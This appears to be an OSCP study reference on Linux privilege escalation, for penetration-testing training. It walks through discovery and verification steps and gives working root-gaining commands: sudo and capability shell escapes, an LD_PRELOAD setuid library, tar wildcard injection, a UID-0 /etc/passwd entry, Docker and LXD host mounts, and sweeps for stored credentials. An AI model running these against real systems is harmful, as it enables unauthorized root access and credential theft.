# Escalate privileges on Linux

[Overview](../START.canvas) · [Browser map](../Map.html)

For each candidate prove controlled object → effective permission → privileged consumer → execution identity → trigger → effect. Enumeration tools suggest candidates; they do not establish that chain.

## linux-state

### Establish Linux state and choose an escalation candidate

**Enter:** A new Linux foothold or an identity/privilege change

**Discovery**

```text
id
findmnt
ps auxww
sudo -l
```

**Interpret:** The sudo rule and privileged backup consumer open different candidate families; neither should be replaced by an automatic kernel choice.

**Still check:** For each candidate establish exact permitted operation/object, run-as identity and trigger.

**Verify:** Record effective UID/groups, host/namespace and the exact candidate permission; re-check identity after every claimed escalation.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-state)

### Full procedure and variants

> **Decisive output:** current identity/groups, OS/kernel/architecture, network position, root-owned activity, mounts and exact sudo rules.

```bash
hostname; id; groups
uname -a; cat /etc/os-release; getconf LONG_BIT
pwd; umask; env
ip addr; ip route; ss -lntup; ss -lxnp
ps auxf
mount; findmnt; lsblk; df -hT
sudo -n -l 2>&1
sudo -l
```

```bash
getent passwd
awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd
```

> **Priority:** credentials/sudo → root-consumed writable objects → SUID/capabilities → privileged groups/mounts/local services → PATH/libraries/wildcards → software/kernel.

```bash
id; whoami; groups
hostname; pwd
ip addr; ip route
```

After root, re-enumerate newly readable credentials, services, listeners, mounts and routes. Capture the exact command, decisive output and state transition required by the objective; keep target details and proof material private.

### Follow the evidence

- [ Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions) — A root-consumed file or directory appears writable Required: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately
- [ Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo) — sudo -l grants an operation under a more useful identity Required: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it
- [ Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs) — Root-owned cron, systemd or recurring process activity uses a controllable object Required: Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger
- [ Use privileged group, daemon or container-management control](linux-privesc.md#linux-containers) — Membership or socket ACLs permit controlling a rootful daemon or useful session Required: Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation
- [ Select an evidence-matched Linux software or kernel exploit](linux-privesc.md#linux-kernel) — Permission/credential paths are insufficient and an exact affected build/configuration is present Required: Vulnerable package/kernel state, architecture, mitigations, namespaces and documented exploit-specific conditions
## linux-permissions

### Prove effective file, directory, ACL and mount control

**Enter:** A root-consumed file or directory appears writable

**Discovery**

```text
namei -l /PATH/TO/OBJECT
getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT
findmnt -T /PATH/TO/OBJECT
```

**Interpret:** Parent replacement can provide a control primitive even when the existing file's write bit is absent.

**Still check:** Run namei -l, stat and getfacl on the exact path and its parents, then findmnt -T for ro/noexec/nosuid. Check the identity and trigger of the process that uses this path; write permission alone is not execution.

**Verify:** Prove the specific read/write/replace action and consumer path; world-writable alone is not the complete escalation chain.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-permissions)

### Full procedure and variants

```bash
namei -l /PATH/TO/OBJECT
stat /PATH/TO/OBJECT /PATH/TO/PARENT
getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS
```

> Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. `nosuid` defeats SUID/SGID and file-capability effects; `noexec` blocks direct execution; `ro` blocks changes.

Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under `/etc`, `/opt`, `/usr/local`, application paths and service working directories:

```bash
find / -xdev -type f -writable -ls 2>/dev/null
find / -xdev -type d -writable -ls 2>/dev/null
```

### Follow the evidence

- [ Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs) — Root-owned cron, systemd or recurring process activity uses a controllable object Required: Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger
- [ Control a privileged program's shared-library resolution](linux-privesc.md#linux-library) — A privileged executable has an unsafe library dependency, RPATH/RUNPATH or plugin path Required: Actual privileged load from a controlled location, matching ABI/name and required symbols, plus a trigger
- [ Change a writable account or privilege-policy file](linux-privesc.md#linux-policy) — Account metadata or a privilege-policy file appears writable Required: Effective write/replace permission, known file syntax and a useful identity/policy consumer; preserve the original
## linux-secrets

### Recover credentials from Linux user, service and process trails

**Enter:** Readable configuration, shell history, environment, process arguments or session sockets

**Discovery**

```text
ps auxww
history
find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null
```

**Interpret:** An actual service's readable configuration supplies an identity-labelled secret candidate.

**Still check:** Read the named config/history/process artifact and record the user, service and host it belongs to. Classify a recovered password/key, test one matching service context and verify the accepted identity before trying reuse elsewhere.

**Verify:** Record source, exact material type and validated identity/service; keep real secrets in private lab records.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-secrets)

### Full procedure and variants

```bash
history 2>/dev/null
find /home /root -maxdepth 3 -type f \
  \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \
     -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \
  -readable 2>/dev/null

grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \
  /var/www /opt /srv /etc 2>/dev/null | head -n 200
```

Inspect process arguments and readable process environment:

```bash
ps auxww
ps eww -u root 2>/dev/null
tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo
tr '\0' '\n' < /proc/PID/environ 2>/dev/null
```

Check reusable local sessions/agents only when their sockets are accessible:

```bash
w; who; last -n 20
env | grep -E 'SSH_AUTH_SOCK|TMUX|STY'
tmux ls 2>/dev/null
screen -ls 2>/dev/null
find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null
```

> An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking.

> **Next:** identify the value's user/service context, validate the smallest relevant transition (`su`, `sudo`, SSH or application authentication), then re-enumerate. Use [credential handling](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md) for cracking/reuse.

```bash
find /home /var/www /opt /srv -type f \
  \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \
     -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null

rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \
  /var/www /opt /srv 2>/dev/null
```

### Follow the evidence

- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Use MySQL/MariaDB data and file primitives](services.md#service-mysql) — A MySQL-compatible service and valid application/database credentials Required: Database authentication and exact schema/file privileges; secure_file_priv and server filesystem identity constrain file actions
## linux-sudo

### Use an allowed sudo operation to cross a privilege boundary

**Enter:** sudo -l grants an operation under a more useful identity

**Discovery**

```text
sudo -n -l 2>&1
sudo -l
```

**Interpret:** The rule permits that exact program as root; its documented privileged operation becomes a candidate.

**Still check:** Read sudo -l: match the run-as user, exact executable and allowed arguments. Check NOPASSWD/password access and NOEXEC/environment restrictions; choose only the GTFOBins operation that the full rule permits, then verify id.

**Verify:** Verify the executed run-as identity and effective UID; preserve the matching rule and successful operation.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-sudo)

### Full procedure and variants

```bash
sudo -n -l 2>&1
sudo -l
sudo --version
```

Record the run-as identity, password tag, executable path, argument constraints/wildcards and `SETENV`/`NOSETENV`/`env_keep`/`secure_path`/`NOEXEC`. Match the exact mode under [GTFOBins](https://gtfobins.github.io/).

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
```

> Use an example only when the entire rule permits it. Restricted arguments, another path/build, privilege dropping, `NOEXEC`, a non-root run-as user or MAC policy can invalidate the escape.

<details>
<summary><strong>Preserved LD_PRELOAD variant</strong></summary>

> Requires an explicitly allowed/preserved variable and a dynamically linked allowed program.

```bash
sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD'
```

```c
#include <stdlib.h>
#include <unistd.h>
void _init(void) {
  unsetenv("LD_PRELOAD");
  setgid(0); setuid(0);
  system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM
```

> Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.

</details>

### Follow the evidence

- [ Load a controlled library through a permitted sudo environment](linux-privesc.md#linux-preload) — A sudo rule explicitly preserves or permits a loader variable Required: Allowed variable setting/preservation, a dynamically linked permitted executable and a loader path that honors it
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Recover credentials from Linux user, service and process trails](linux-privesc.md#linux-secrets) — Readable configuration, shell history, environment, process arguments or session sockets Required: Read access to the artifact; exact account/service context; session/agent access must include a usable live identity
## linux-preload

### Load a controlled library through a permitted sudo environment

**Enter:** A sudo rule explicitly preserves or permits a loader variable

**Discovery**

```text
sudo -l
file /ALLOWED/PROGRAM
readelf -l /ALLOWED/PROGRAM
```

**Interpret:** Explicit environment permission plus a compatible dynamic consumer suggests a loader-injection candidate.

**Still check:** Confirm SETENV or explicit LD_PRELOAD preservation in sudo -l and a dynamically linked allowed program. Use only the permitted environment form; inspect the resulting id rather than assuming the shared library ran as root.

**Verify:** Require the library's actual effect and effective identity; a successful compile alone proves nothing about the loader.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-preload)

### Full procedure and variants

<details>
<summary><strong>Preserved LD_PRELOAD variant</strong></summary>

> Requires an explicitly allowed/preserved variable and a dynamically linked allowed program.

```bash
sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD'
```

```c
#include <stdlib.h>
#include <unistd.h>
void _init(void) {
  unsetenv("LD_PRELOAD");
  setgid(0); setuid(0);
  system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM
```

> Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.

</details>

### Follow the evidence

- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo) — sudo -l grants an operation under a more useful identity Required: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it
- [ Control a privileged program's shared-library resolution](linux-privesc.md#linux-library) — A privileged executable has an unsafe library dependency, RPATH/RUNPATH or plugin path Required: Actual privileged load from a controlled location, matching ABI/name and required symbols, plus a trigger
## linux-suid

### Use a SUID or SGID program's exposed privileged primitive

**Enter:** A nonstandard or dangerous privileged executable

**Discovery**

```text
find / -xdev -type f -perm -4000 -ls 2>/dev/null
find / -xdev -type f -perm -2000 -ls 2>/dev/null
file /PATH/TO/BINARY
```

**Interpret:** The s bits identify an execution credential mechanism; nonstandard behavior warrants inspection but is not a vulnerability itself.

**Still check:** Run stat on the flagged executable and findmnt -T on its path. Check the SUID owner, nosuid and exact binary behavior; after a permitted operation run id to see whether the elevated effective UID was retained.

**Verify:** Verify effective IDs and the exact privileged operation; a real UID or prompt label alone is insufficient.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-suid)

### Full procedure and variants

```bash
find / -xdev -type f -perm -4000 -ls 2>/dev/null
find / -xdev -type f -perm -2000 -ls 2>/dev/null
getcap -r / 2>/dev/null
```

Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate:

```bash
namei -l /PATH/TO/BINARY
stat /PATH/TO/BINARY
file /PATH/TO/BINARY
readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /PATH/TO/BINARY 2>/dev/null
strings /PATH/TO/BINARY | head -n 150
dpkg -S /PATH/TO/BINARY 2>/dev/null
rpm -qf /PATH/TO/BINARY 2>/dev/null
```

> Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves.

<details>
<summary><strong>Capability interpretation and example</strong></summary>

High-value capability candidates include `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_ptrace`, `cap_sys_admin`, `cap_setfcap` and `cap_sys_module`. `cap_net_raw` is usually not a direct root transition.

```bash
capsh --print 2>/dev/null
grep '^Cap' /proc/self/status
```

Only when the exact interpreter has effective `cap_setuid`:

```bash
/PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
```

> `+ep` indicates permitted plus the file effective bit. Bounding sets, namespaces, `nosuid` mounts and program behavior can still change the result.

</details>

### Follow the evidence

- [ Hijack an unqualified helper through controlled PATH resolution](linux-privesc.md#linux-path) — A privileged program/job invokes a helper without an absolute path Required: A controlled directory precedes the real helper in the consumer's effective PATH; execution preserves useful privilege and a trigger exists
- [ Use a file capability that enables a specific privileged operation](linux-privesc.md#linux-capabilities) — An interpreter/helper has an effective high-value capability Required: The exact capability is effective in the execution context; mount/namespace/bounding-set restrictions permit its use
- [ Control a privileged program's shared-library resolution](linux-privesc.md#linux-library) — A privileged executable has an unsafe library dependency, RPATH/RUNPATH or plugin path Required: Actual privileged load from a controlled location, matching ABI/name and required symbols, plus a trigger
## linux-capabilities

### Use a file capability that enables a specific privileged operation

**Enter:** An interpreter/helper has an effective high-value capability

**Discovery**

```text
getcap -r / 2>/dev/null
capsh --print 2>/dev/null
```

**Interpret:** The specific interpreter has effective set-UID authority, unlike an ordinary copy of python3 elsewhere.

**Still check:** Read getcap for the exact executable, inspect its mount and match the named capability to the program operation. A version or capability name alone does not prove that the program retains a useful effective capability.

**Verify:** Match the granted capability to the observed effect and effective IDs; do not infer unrelated root powers.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-capabilities)

### Full procedure and variants

<details>
<summary><strong>Capability interpretation and example</strong></summary>

High-value capability candidates include `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_ptrace`, `cap_sys_admin`, `cap_setfcap` and `cap_sys_module`. `cap_net_raw` is usually not a direct root transition.

```bash
capsh --print 2>/dev/null
grep '^Cap' /proc/self/status
```

Only when the exact interpreter has effective `cap_setuid`:

```bash
/PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
```

> `+ep` indicates permitted plus the file effective bit. Bounding sets, namespaces, `nosuid` mounts and program behavior can still change the result.

</details>

### Follow the evidence

- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Recover credentials from Linux user, service and process trails](linux-privesc.md#linux-secrets) — Readable configuration, shell history, environment, process arguments or session sockets Required: Read access to the artifact; exact account/service context; session/agent access must include a usable live identity
- [ Use a SUID or SGID program's exposed privileged primitive](linux-privesc.md#linux-suid) — A nonstandard or dangerous privileged executable Required: Effective SUID/SGID on the relevant mount; a program operation preserves and exposes useful privilege
## linux-jobs

### Control a script, binary or configuration consumed by a privileged job/service

**Enter:** Root-owned cron, systemd or recurring process activity uses a controllable object

**Discovery**

```text
cat /etc/crontab
systemctl list-timers --all
ps auxww
```

**Interpret:** The schedule explicitly names a privileged consumer and an exact file to inspect.

**Still check:** Observe the actual command and UID with pspy or inspect the unit with systemctl cat/show. Run namei -l, stat and getfacl on the consumed path and parents; identify the timer, restart or invocation before changing the file.

**Verify:** Verify the consumer's resulting effect and identity; editing a file without an observed trigger is incomplete.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-jobs)

### Full procedure and variants

```bash
crontab -l 2>/dev/null
cat /etc/crontab
cat /etc/anacrontab 2>/dev/null
atq 2>/dev/null
ls -la /etc/cron.* /var/spool/cron 2>/dev/null
grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100

systemctl list-timers --all
systemctl list-unit-files --type=service
systemctl list-units --type=service --state=running
systemctl cat UNIT
systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles
```

Observe short-lived commands:

```bash
./pspy64
./pspy64 -pf -i 1000
```

Validate every referenced script, binary, configuration, environment file, plugin and parent:

```bash
namei -l /PATH/TO/OBJECT
stat /PATH/TO/OBJECT /PATH/TO/PARENT
getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
```

> **Prove:** exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment.

Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input.

### Follow the evidence

- [ Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions) — A root-consumed file or directory appears writable Required: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately
- [ Hijack an unqualified helper through controlled PATH resolution](linux-privesc.md#linux-path) — A privileged program/job invokes a helper without an absolute path Required: A controlled directory precedes the real helper in the consumer's effective PATH; execution preserves useful privilege and a trigger exists
- [ Turn wildcard-expanded filenames into privileged command options](linux-privesc.md#linux-wildcard) — A privileged job passes an uncontrolled directory glob to an option-parsing utility Required: Control of expanded filenames; compatible option parsing and argument placement; useful program feature and privileged trigger
## linux-path

### Hijack an unqualified helper through controlled PATH resolution

**Enter:** A privileged program/job invokes a helper without an absolute path

**Discovery**

```text
printf '%s\n' "$PATH"
namei -l /PATH/TO/CANDIDATE_DIRECTORY
strings /PATH/TO/REVIEWED_BINARY
```

**Interpret:** An unqualified helper can resolve through the controlled earlier directory in the consumer's environment.

**Still check:** Find the helper name in the privileged script or observed pspy command. Check that it is unqualified and identify the consumer's real PATH; a writable directory matters only if that consumer searches it first.

**Verify:** Prove actual helper selection and effective identity through a controlled effect.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-path)

### Full procedure and variants

```bash
echo "$PATH" | tr ':' '\n'
echo "$PATH" | tr ':' '\n' | while IFS= read -r d; do
  [ -z "$d" ] && d=.
  [ -w "$d" ] && ls -ld "$d"
done
strings /PATH/TO/PRIVILEGED_BINARY | grep -E '(^|[^/])(cp|tar|service|sh|bash|cat)( |$)'
```

If the privileged consumer resolves `helper` through a controllable PATH:

```bash
printf '#!/bin/sh\n/usr/bin/id > /tmp/path-proof\n' > /WRITABLE/DIR/helper
chmod 700 /WRITABLE/DIR/helper
PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER
cat /tmp/path-proof
```

> Requires a relative command, the consumer's effective PATH, an earlier writable directory, trigger and retained privilege. Your interactive PATH alone is inconclusive.

### Follow the evidence

- [ Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs) — Root-owned cron, systemd or recurring process activity uses a controllable object Required: Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger
- [ Use a SUID or SGID program's exposed privileged primitive](linux-privesc.md#linux-suid) — A nonstandard or dangerous privileged executable Required: Effective SUID/SGID on the relevant mount; a program operation preserves and exposes useful privilege
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
## linux-wildcard

### Turn wildcard-expanded filenames into privileged command options

**Enter:** A privileged job passes an uncontrolled directory glob to an option-parsing utility

**Discovery**

```text
cat /PATH/TO/REVIEWED_JOB_SCRIPT
ls -la /PATH/TO/JOB_DIRECTORY
namei -l /PATH/TO/JOB_DIRECTORY
```

**Interpret:** Controlled filenames may become utility arguments after glob expansion; the exact utility and option ordering decide the method.

**Still check:** Inspect the exact privileged command: confirm that a wildcard expands attacker-controlled names into option positions and that the utility interprets those options. A writable directory without that command/trigger does not enable this route.

**Verify:** Verify the utility's actual triggered effect and its identity, not merely that special filenames exist.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-wildcard)

### Full procedure and variants

```bash
grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \
  /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null
```

GNU tar proof, only when a privileged job executes compatible `tar ... *` in an attacker-writable directory:

```bash
printf '#!/bin/sh\n/usr/bin/id > /tmp/wildcard-proof\n' > proof.sh
chmod 700 proof.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh proof.sh'
```

> Confirm working directory, wildcard placement, utility implementation/options, privileged identity and trigger. Do not assume every wildcard or utility accepts filename-derived options.

### Follow the evidence

- [ Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs) — Root-owned cron, systemd or recurring process activity uses a controllable object Required: Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions) — A root-consumed file or directory appears writable Required: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately
## linux-policy

### Change a writable account or privilege-policy file

**Enter:** Account metadata or a privilege-policy file appears writable

**Discovery**

```text
stat /etc/passwd /etc/shadow /etc/sudoers
getfacl -p /etc/passwd /etc/sudoers 2>/dev/null
```

**Interpret:** A sensitive account file appears writable; the authentication implementation and valid record syntax determine its effect.

**Still check:** Preserve original state; confirm exact effective write, file consumer, useful identity and recovery/trigger.

**Verify:** Verify the resulting identity/authorized action and retain the exact change plus recovery copy privately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-policy)

### Full procedure and variants

```bash
ls -l /etc/passwd /etc/shadow /etc/sudoers
namei -l /etc/passwd
getfacl -p /etc/passwd 2>/dev/null
```

<details>
<summary><strong>Writable /etc/passwd — authorized disposable lab only</strong></summary>

```bash
cp /etc/passwd /tmp/passwd.backup
HASH=$(openssl passwd -6 'TEMP_PASSWORD')
printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd
su - root2
id
```

> Preserve a known-good copy and restore it. UID/GID 0 creates a superuser. Do not risk corrupting a host when no safe recovery exists.

</details>

Also inspect effective access to `/etc/sudoers.d`, PAM, SSH authorized-key locations and root-executed startup/configuration files.

### Follow the evidence

- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions) — A root-consumed file or directory appears writable Required: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately
## linux-containers

### Use privileged group, daemon or container-management control

**Enter:** Membership or socket ACLs permit controlling a rootful daemon or useful session

**Discovery**

```text
id
ls -l /var/run/docker.sock
cat /proc/1/cgroup
```

**Interpret:** Effective socket access suggests daemon control; group text alone does not establish host-affecting rootful operations.

**Still check:** Check API acceptance, rootful/rootless and namespace policy, available resources and the specific host operation.

**Verify:** Distinguish host and container namespace, effective UID and the exact host operation.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-containers)

### Full procedure and variants

```bash
id
ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
docker version 2>/dev/null
lxc list 2>/dev/null
```

Group candidates include `docker`, `lxd`/`lxc`, `disk`, `shadow`, `adm`, `systemd-journal` and `libvirt`. Prove the associated resource and effective permission.

<details>
<summary><strong>Rootful Docker daemon with an available image</strong></summary>

```bash
docker images
docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh
```

> Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.

</details>

<details>
<summary><strong>LXD/LXC with an available image alias</strong></summary>

```bash
lxc image list
lxc init IMAGE_ALIAS privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

> Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.

</details>

### Follow the evidence

- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Recover credentials from Linux user, service and process trails](linux-privesc.md#linux-secrets) — Readable configuration, shell history, environment, process arguments or session sockets Required: Read access to the artifact; exact account/service context; session/agent access must include a usable live identity
- [ Exploit a permission-backed mount, NFS mapping or local service](linux-privesc.md#linux-mounts) — A writable/exported filesystem or a loopback-only service with useful privileges Required: Relevant export/mount options or service authentication; effective identity, writable path and any privileged execution consumer
## linux-mounts

### Exploit a permission-backed mount, NFS mapping or local service

**Enter:** A writable/exported filesystem or a loopback-only service with useful privileges

**Discovery**

```text
findmnt
cat /etc/exports 2>/dev/null
ss -lntup
```

**Interpret:** A local-only service or export mapping creates a specific investigation route, not automatic escalation.

**Still check:** For the service check accepted identity/rights; for NFS check client mapping, write permissions, mount flags and target-side consumer.

**Verify:** Verify the actual file/service operation, mapped identity and any resulting execution effect.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-mounts)

### Full procedure and variants

```bash
findmnt
cat /etc/fstab
mount
ss -lntup
ss -lxnp
```

For NFS, a writable export plus `no_root_squash` can trust client-root-created ownership/SUID metadata. Confirm export options, writable mount, target-side mount options and compatible execution. See [NFS/RPC](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/02-service-enumeration/05-nfs-rpc.md).

Root-only loopback services and UNIX sockets are candidates only. Identify protocol/authentication and prove a privileged action through a controlled request, configuration, plugin or file.

### Follow the evidence

- [ Inspect RPC/NFS exports and effective file identity](services.md#service-nfs) — RPC/NFS listeners or export information Required: Reachable RPC/NFS transports, permitted client address and an export whose UID/GID mapping grants relevant access
- [ Use MySQL/MariaDB data and file primitives](services.md#service-mysql) — A MySQL-compatible service and valid application/database credentials Required: Database authentication and exact schema/file privileges; secure_file_priv and server filesystem identity constrain file actions
- [ Forward a selected service through an SSH client-side listener](pivoting.md#ssh-local) — SSH reaches a server that can access the needed internal service Required: Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route
## linux-library

### Control a privileged program's shared-library resolution

**Enter:** A privileged executable has an unsafe library dependency, RPATH/RUNPATH or plugin path

**Discovery**

```text
readelf -d /PATH/TO/BINARY
namei -l /PATH/TO/LIBRARY_DIRECTORY
```

**Interpret:** A named dependency plus a potentially controlled search location is a loader-resolution candidate.

**Still check:** Verify actual runtime selection, ABI/symbols, secure-execution rules, retained privilege and a trigger.

**Verify:** Prove the selected library path and effective execution identity; retain dependency and trigger evidence.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-library)

### Full procedure and variants

```bash
file /PATH/TO/BINARY
readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /PATH/TO/BINARY 2>/dev/null
```

> Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer `readelf` over executing an untrusted file through an unsafe `ldd` implementation.

For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected:

```bash
grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT
/PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))'
```

> Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo.

### Follow the evidence

- [ Load a controlled library through a permitted sudo environment](linux-privesc.md#linux-preload) — A sudo rule explicitly preserves or permits a loader variable Required: Allowed variable setting/preservation, a dynamically linked permitted executable and a loader path that honors it
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
- [ Compile and minimally adapt an existing native or memory-corruption PoC](public-exploits.md#exploit-compile) — An existing C/C++ or platform-specific PoC matches the candidate Required: Correct compiler/target architecture, runtime dependencies, documented payload constraints and validated exploit-specific constants
## linux-kernel

### Select an evidence-matched Linux software or kernel exploit

**Enter:** Permission/credential paths are insufficient and an exact affected build/configuration is present

**Discovery**

```text
uname -a
cat /etc/os-release
getconf LONG_BIT
```

**Interpret:** A version-associated advisory is a candidate; backports and feature state determine applicability.

**Still check:** Collect uname and the distribution's package/build plus architecture. Match the advisory's vulnerable feature and vendor patch status before choosing a PoC; try a confirmed sudo/file/credential route first when one exists.

